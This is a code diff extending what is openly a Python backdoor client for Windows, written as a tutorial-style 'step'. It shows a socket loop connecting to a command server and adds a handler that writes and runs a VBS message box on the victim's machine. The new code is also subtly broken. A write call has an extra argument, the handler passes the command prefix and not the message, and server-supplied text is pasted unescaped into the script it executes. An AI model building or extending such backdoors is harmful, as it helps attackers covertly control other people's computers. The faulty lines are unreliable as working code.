@@ -43,7 +43,7 @@ mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")
 
 
 # if Mutex is Already Created (mean app is running now), Exit the App
-if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
+if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS: # noqa
     mutex = None
     exit(0)
 
@@ -105,6 +105,16 @@ send = lambda data: objSocket.send(data)
 # Step 8: Connect to Server Implement Main Loop for Connect Client to Server
 server_connect()
 
+# Step 21: Define `MessageBox()` Function to Show Received Message from the Server
+def MessageBox(message):
+    objVBS = open(TMP + "/m.vbs", "w")
+
+    objVBS.write("MsgBox " + message + " " + vbOkOnly + vbInformation + vbSystemModal, "Message")   # noqa
+    objVBS.close()
+
+    subprocess.Popen(['cscript', TMP + "/m.vbs"], shell=True)
+
+
 while True:
     try:
         while True:
@@ -117,6 +127,9 @@ while True:
             if strData == 'exit':
                 objSocket.close() # noqa
                 exit(0)
+
+            elif strData[:3] == 'msg':
+                MessageBox(strData[:3])
 
     # Handle if Backdoor Server not Responding try to Reconnect to Server
     except socket.error():
